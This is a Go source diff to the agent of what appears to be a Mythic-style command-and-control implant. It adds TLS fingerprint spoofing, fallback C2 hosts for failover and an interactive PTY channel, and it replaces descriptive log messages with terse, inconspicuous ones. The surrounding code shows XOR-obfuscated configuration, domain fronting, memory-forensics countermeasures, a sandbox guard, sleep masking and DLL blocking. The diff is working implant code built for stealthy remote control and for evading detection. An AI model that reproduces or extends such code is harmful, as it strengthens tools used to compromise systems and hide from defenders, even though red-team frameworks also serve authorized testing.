@@ -48,6 +48,8 @@ var (
 	hostHeader        string = ""     // Override Host header for domain fronting
 	proxyURL          string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
 	tlsVerify         string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
+	tlsFingerprint    string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
+	fallbackHosts     string = ""     // Comma-separated fallback C2 URLs for automatic failover
 	workingHoursStart string = ""     // Working hours start (HH:MM, 24hr local time)
 	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
 	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
@@ -92,6 +94,7 @@ func runAgent() {
 			hostHeader = xorDecodeString(hostHeader, keyBytes)
 			proxyURL = xorDecodeString(proxyURL, keyBytes)
 			customHeaders = xorDecodeString(customHeaders, keyBytes)
+			fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
 			// Zero the XOR key — no longer needed after deobfuscation
 			zeroBytes(keyBytes)
 		}
@@ -100,27 +103,27 @@ func runAgent() {
 	// Convert string build variables to appropriate types with validation
 	callbackPortInt, err := strconv.Atoi(callbackPort)
 	if err != nil {
-		log.Printf("[WARNING] Invalid callbackPort %q, defaulting to 443", callbackPort)
+		log.Printf("cfg: port=%q fallback=443", callbackPort)
 		callbackPortInt = 443
 	}
 	sleepIntervalInt, err := strconv.Atoi(sleepInterval)
 	if err != nil || sleepIntervalInt < 0 {
-		log.Printf("[WARNING] Invalid sleepInterval %q, defaulting to 10", sleepInterval)
+		log.Printf("cfg: interval=%q fallback=10", sleepInterval)
 		sleepIntervalInt = 10
 	}
 	jitterInt, err := strconv.Atoi(jitter)
 	if err != nil || jitterInt < 0 || jitterInt > 100 {
-		log.Printf("[WARNING] Invalid jitter %q, defaulting to 10", jitter)
+		log.Printf("cfg: jitter=%q fallback=10", jitter)
 		jitterInt = 10
 	}
 	killDateInt64, err := strconv.ParseInt(killDate, 10, 64)
 	if err != nil {
-		log.Printf("[WARNING] Invalid killDate %q, defaulting to 0 (disabled)", killDate)
+		log.Printf("cfg: expiry=%q fallback=0", killDate)
 		killDateInt64 = 0
 	}
 	maxRetriesInt, err := strconv.Atoi(maxRetries)
 	if err != nil || maxRetriesInt < 0 {
-		log.Printf("[WARNING] Invalid maxRetries %q, defaulting to 10", maxRetries)
+		log.Printf("cfg: retries=%q fallback=10", maxRetries)
 		maxRetriesInt = 10
 	}
 	debugBool, err := strconv.ParseBool(debug)
@@ -138,12 +141,12 @@ func runAgent() {
 	// Verify required configuration
 	if payloadUUID == "" {
 		payloadUUID = uuid.New().String()
-		log.Printf("[WARNING] No payload UUID provided, generated: %s", payloadUUID)
+		log.Printf("cfg: generated id=%s", payloadUUID)
 	}
 
 	// Check kill date
 	if killDateInt64 > 0 && time.Now().Unix() > killDateInt64 {
-		log.Printf("[INFO] Agent past kill date, exiting")
+		log.Printf("expired, exiting")
 		os.Exit(0)
 	}
 
@@ -178,21 +181,21 @@ func runAgent() {
 	var whDays []int
 	if workingHoursStart != "" {
 		if parsed, err := structs.ParseWorkingHoursTime(workingHoursStart); err != nil {
-			log.Printf("[WARNING] Invalid workingHoursStart %q: %v", workingHoursStart, err)
+			log.Printf("cfg: sched start=%q: %v", workingHoursStart, err)
 		} else {
 			whStartMinutes = parsed
 		}
 	}
 	if workingHoursEnd != "" {
 		if parsed, err := structs.ParseWorkingHoursTime(workingHoursEnd); err != nil {
-			log.Printf("[WARNING] Invalid workingHoursEnd %q: %v", workingHoursEnd, err)
+			log.Printf("cfg: sched end=%q: %v", workingHoursEnd, err)
 		} else {
 			whEndMinutes = parsed
 		}
 	}
 	if workingDays != "" {
 		if parsed, err := structs.ParseWorkingDays(workingDays); err != nil {
-			log.Printf("[WARNING] Invalid workingDays %q: %v", workingDays, err)
+			log.Printf("cfg: sched days=%q: %v", workingDays, err)
 		} else {
 			whDays = parsed
 		}
@@ -225,7 +228,7 @@ func runAgent() {
 
 	if tcpBindAddress != "" {
 		// TCP P2P mode — this agent is a child that listens for a parent connection
-		log.Printf("[INFO] TCP P2P mode: binding to %s", tcpBindAddress)
+		log.Printf("bind %s", tcpBindAddress)
 		tcpProfile := tcp.NewTCPProfile(tcpBindAddress, encryptionKey, debugBool)
 		c2 = profiles.NewTCPProfile(tcpProfile)
 		// Make TCP profile available to link/unlink commands
@@ -237,6 +240,22 @@ func runAgent() {
 			callbackURL = fmt.Sprintf("%s:%d", callbackHost, callbackPortInt)
 		} else {
 			callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
+		}
+
+		// Parse fallback C2 URLs (comma-separated, each gets same port appended if needed)
+		var fallbackURLs []string
+		if fallbackHosts != "" {
+			for _, fb := range strings.Split(fallbackHosts, ",") {
+				fb = strings.TrimSpace(fb)
+				if fb == "" {
+					continue
+				}
+				if strings.HasPrefix(fb, "http://") || strings.HasPrefix(fb, "https://") {
+					fallbackURLs = append(fallbackURLs, fmt.Sprintf("%s:%d", fb, callbackPortInt))
+				} else {
+					fallbackURLs = append(fallbackURLs, fmt.Sprintf("http://%s:%d", fb, callbackPortInt))
+				}
+			}
 		}
 
 		httpProfile := http.NewHTTPProfile(
@@ -252,6 +271,8 @@ func runAgent() {
 			hostHeader,
 			proxyURL,
 			tlsVerify,
+			tlsFingerprint,
+			fallbackURLs,
 		)
 		// Decode and apply custom HTTP headers from C2 profile
 		if customHeaders != "" {
@@ -268,7 +289,7 @@ func runAgent() {
 		// UserAgent, endpoints) with AES-256-GCM. Fields are only decrypted on-demand
 		// for the duration of each HTTP operation, reducing memory forensics exposure.
 		if err := httpProfile.SealConfig(); err != nil {
-			log.Printf("[WARNING] Config vault seal failed: %v (fields remain in plaintext)", err)
+			log.Printf("seal failed: %v", err)
 		}
 
 		// Also create a TCP profile instance for P2P child management.
@@ -293,12 +314,19 @@ func runAgent() {
 		commands.SetRpfwdManager(rpfwdManager)
 		httpProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
 		httpProfile.HandleRpfwd = rpfwdManager.HandleMessages
+
+		// Wire up interactive hooks for PTY/terminal bidirectional streaming
+		httpProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
+		httpProfile.HandleInteractive = commands.RouteInteractiveInput
 	}
 
 	// Configure child process protections (Windows: block non-Microsoft DLLs)
 	if blockDLLs == "true" {
 		commands.SetBlockDLLs(true)
 	}
+
+	// Share configured User-Agent with commands (e.g., curl) to avoid hardcoded duplicates
+	commands.DefaultUserAgent = userAgent
 
 	// Clear build-time globals — all values have been copied into agent/profile structs.
 	// Prevents memory forensics from extracting sensitive config from the data segment.
@@ -313,10 +341,10 @@ func runAgent() {
 	files.Initialize()
 
 	// Initial checkin with exponential backoff retry
-	log.Printf("[INFO] Starting initial checkin...")
+	log.Printf("connecting")
 	for attempt := 0; attempt < maxRetriesInt; attempt++ {
 		if err := c2.Checkin(agent); err != nil {
-			log.Printf("[ERROR] Initial checkin attempt %d failed: %v", attempt+1, err)
+			log.Printf("connect attempt %d: %v", attempt+1, err)
 			backoffMultiplier := 1 << min(attempt, 8)
 			backoffSeconds := sleepIntervalInt * backoffMultiplier
 			if backoffSeconds > 300 {
@@ -326,10 +354,10 @@ func runAgent() {
 			time.Sleep(sleepTime)
 			continue
 		}
-		log.Printf("[INFO] Initial checkin successful")
+		log.Printf("connected")
 		goto checkinDone
 	}
-	log.Printf("[ERROR] All initial checkin attempts failed, exiting")
+	log.Printf("all connect attempts failed")
 	return
 checkinDone:
 
@@ -350,7 +378,7 @@ checkinDone:
 
 	go func() {
 		sig := <-sigChan
-		log.Printf("[INFO] Received signal: %v, shutting down gracefully", sig)
+		log.Printf("signal %v, stopping", sig)
 		cancel()
 	}()
 
@@ -359,10 +387,10 @@ checkinDone:
 	defer socksManager.Close()
 
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
-	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
+	log.Printf("running %s", agent.PayloadUUID[:8])
 	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sandboxGuardEnabled, sleepMaskEnabled)
 	usePadding() // Reference embedded padding to prevent compiler stripping
-	log.Printf("[INFO] agent shutdown complete")
+	log.Printf("stopped")
 }
 
 func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool) {
@@ -374,12 +402,12 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 	for {
 		select {
 		case <-ctx.Done():
-			log.Printf("[INFO] Context cancelled, exiting main loop")
+			log.Printf("cancelled")
 			return
 		default:
 			// Enforce kill date every cycle — exit silently if past expiry
 			if agent.KillDate > 0 && time.Now().Unix() > agent.KillDate {
-				log.Printf("[INFO] Kill date reached, exiting")
+				log.Printf("expired")
 				return
 			}
 
@@ -390,7 +418,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					// Add jitter to the wake time (±jitter% of sleep interval, not the full wait)
 					jitterOffset := calculateSleepTime(agent.SleepInterval, agent.Jitter) - time.Duration(agent.SleepInterval)*time.Second
 					sleepDuration := time.Duration(waitMinutes)*time.Minute + jitterOffset
-					log.Printf("[INFO] Outside working hours, sleeping %v until next work period", sleepDuration)
+					log.Printf("schedule pause %v", sleepDuration)
 					var whVault *sleepVault
 					if sleepMaskEnabled {
 						whVault = obfuscateSleep(agent, c2)
@@ -409,7 +437,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			// Get tasks and inbound SOCKS data from C2 server
 			tasks, inboundSocks, err := c2.GetTasking(agent, outboundSocks)
 			if err != nil {
-				log.Printf("[ERROR] Failed to get tasking: %v", err)
+				log.Printf("poll error: %v", err)
 				retryCount++
 				// Exponential backoff: sleep 2^(retryCount-1) * base interval, capped at 5 minutes
 				backoffMultiplier := 1 << min(retryCount-1, 8) // 1, 2, 4, 8, 16, ...
@@ -466,7 +494,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				deobfuscateSleep(vault, agent, c2)
 			}
 			if sleepSkipped {
-				log.Printf("[INFO] Sleep skipping detected, exiting")
+				log.Printf("timing anomaly, exiting")
 				return
 			}
 		}
@@ -475,15 +503,17 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 
 func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager) {
 	task.StartTime = time.Now()
-	log.Printf("[INFO] Processing task: %s (ID: %s)", task.Command, task.ID)
+	log.Printf("exec %s (%s)", task.Command, task.ID)
 
 	// Create Job struct with channels for this task
 	job := &structs.Job{
-		Stop:              new(int),
-		SendResponses:     make(chan structs.Response, 100),
-		SendFileToMythic:  files.SendToMythicChannel,
-		GetFileFromMythic: files.GetFromMythicChannel,
-		FileTransfers:     make(map[string]chan json.RawMessage),
+		Stop:                         new(int),
+		SendResponses:                make(chan structs.Response, 100),
+		SendFileToMythic:             files.SendToMythicChannel,
+		GetFileFromMythic:            files.GetFromMythicChannel,
+		FileTransfers:                make(map[string]chan json.RawMessage),
+		InteractiveTaskInputChannel:  make(chan structs.InteractiveMsg, 100),
+		InteractiveTaskOutputChannel: make(chan structs.InteractiveMsg, 100),
 	}
 	task.Job = job
 
@@ -498,7 +528,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 			case resp := <-job.SendResponses:
 				mythicResp, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
 				if err != nil {
-					log.Printf("[ERROR] Failed to post file transfer response: %v", err)
+					log.Printf("send error: %v", err)
 					continue
 				}
 
@@ -513,7 +543,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 								// Send this response to all active file transfer channels
 								respJSON, err := json.Marshal(firstResp)
 								if err != nil {
-									log.Printf("[ERROR] Failed to marshal file transfer response: %v", err)
+									log.Printf("marshal error: %v", err)
 									continue
 								}
 								job.BroadcastFileTransfer(json.RawMessage(respJSON))
@@ -528,7 +558,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 					case resp := <-job.SendResponses:
 						_, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
 						if err != nil {
-							log.Printf("[ERROR] Failed to post file transfer response: %v", err)
+							log.Printf("send error: %v", err)
 						}
 					default:
 						return
@@ -548,7 +578,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 			Completed:  true,
 		}
 		if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
-			log.Printf("[ERROR] Failed to post response: %v", err)
+			log.Printf("send error: %v", err)
 		}
 		close(done)
 		return
@@ -562,7 +592,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
-				log.Printf("[ERROR] Command %s panicked: %v", task.Command, r)
+				log.Printf("panic in %s: %v", task.Command, r)
 				result = structs.CommandResult{
 					Output:    fmt.Sprintf("Command panicked: %v", r),
 					Status:    "error",
@@ -590,7 +620,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 		Credentials: result.Credentials,
 	}
 	if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
-		log.Printf("[ERROR] Failed to post response: %v", err)
+		log.Printf("send error: %v", err)
 	}
 
 	// Signal the response forwarder to finish and wait for it to drain
@@ -780,6 +810,8 @@ func clearGlobals() {
 	customHeaders = ""
 	xorKey = ""
 	tlsVerify = ""
+	tlsFingerprint = ""
+	fallbackHosts = ""
 	tcpBindAddress = ""
 
 	// Operational parameters
